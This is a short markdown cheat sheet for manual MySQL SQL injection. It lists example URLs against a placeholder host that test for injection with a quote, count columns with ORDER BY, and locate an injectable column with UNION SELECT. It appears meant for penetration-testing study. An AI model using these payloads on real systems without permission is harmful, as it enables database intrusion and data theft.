# SQL Injection

## MySQL
Verify SQL injection: add a simple quote`'`. 
```bash
# Examples
http://target.com/path/?id=5'
```

Sorting columns to find maximum column:
```bash
http://target.com/path/?id=-1 order by 1
http://target.com/path/?id=-1 order by 2
http://target.com/path/?id=-1 order by 3
http://target.com/path/?id=-1 order by 4
# ...
# Try until it stops returing errors, now we have the column count
```

Verify injectable column:  
```bash
http://target.com/path/?id=-1 union select 1, 2, 3, 4
# Select count is depending on the table, maybe try the previous example
# One of the columns will be printed with the respective number
```
